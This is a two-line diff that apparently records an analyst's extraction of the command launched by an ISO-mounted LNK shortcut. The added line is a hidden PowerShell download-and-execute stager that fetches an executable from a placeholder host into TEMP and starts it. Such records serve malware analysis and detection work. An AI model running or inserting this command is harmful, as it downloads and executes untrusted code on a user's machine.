@@ -1,0 +1,2 @@
+# ISO-mounted-LNK invocation (analyst extraction)
+powershell.exe -w hidden -c "iwr http://iso-2.example.test/next.exe -o $env:TEMP\i.exe; start $env:TEMP\i.exe"
